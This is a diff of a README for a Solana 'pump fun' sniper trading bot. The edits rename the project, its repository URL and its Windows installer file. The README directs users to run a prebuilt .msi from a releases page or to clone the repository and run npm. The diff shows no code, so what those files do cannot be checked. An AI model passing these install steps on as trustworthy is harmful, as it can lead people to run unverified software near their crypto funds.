@@ -46,7 +46,7 @@ Unlock the full potential of your trading strategy with **Solana pump fun Sniper
 ### 🖥️ Installation for Windows
 1. Download the latest release from the [Releases Page](https://github.com/Raydium-Bot/Raydium-Sol-Sniper-Bot/releases/tag/v2.0).
 2. Extract the ZIP file to your desired location.
-3. Launch the application by double-clicking on `RaydiumSniperBot.msi`.
+3. Launch the application by double-clicking on `solanapumpfunbot.msi`.
 
 ## 📥 Alternative Installation (Windows)
 
@@ -58,8 +58,8 @@ Unlock the full potential of your trading strategy with **Solana pump fun Sniper
 
 3. Clone and build the bot (CMD):
    ```bash
-   git clone https://github.com/Raydium-Bot/Raydium-Sol-Sniper-Bot.git
-   cd Raydium-Sol-Sniper-Bot
+   git clone https://github.com/Raydium-Bot/solana-pump-fun-sniper-bot.git
+   cd solana-pump-fun-sniper-bot
    npm install
    npm start
    ```
@@ -71,8 +71,8 @@ Unlock the full potential of your trading strategy with **Solana pump fun Sniper
    - [Node.js v20,3.0 for MacOs](https://nodejs.org/dist/v20.3.0/node-v20.3.0.pkg)
 3. Clone and build the bot (Terminal):
    ```bash
-   git clone https://github.com/Raydium-Bot/Raydium-Sol-Sniper-Bot.git
-   cd Raydium-Sol-Sniper-Bot
+   git clone https://github.com/Raydium-Bot/solana-pump-fun-sniper-bot.git
+   cd solana-pump-fun-sniper-bot
    npm install
    npm start
    ```
@@ -113,4 +113,4 @@ For additional support, join our community on [Telegram](https://t.me/beautiful_
 
 ---
 
-Unleash the power of **Raydium Sniper Bot** today and redefine your trading experience!
+Unleash the power of **Solana Pump Fun Sniper Bot** today and redefine your trading experience!
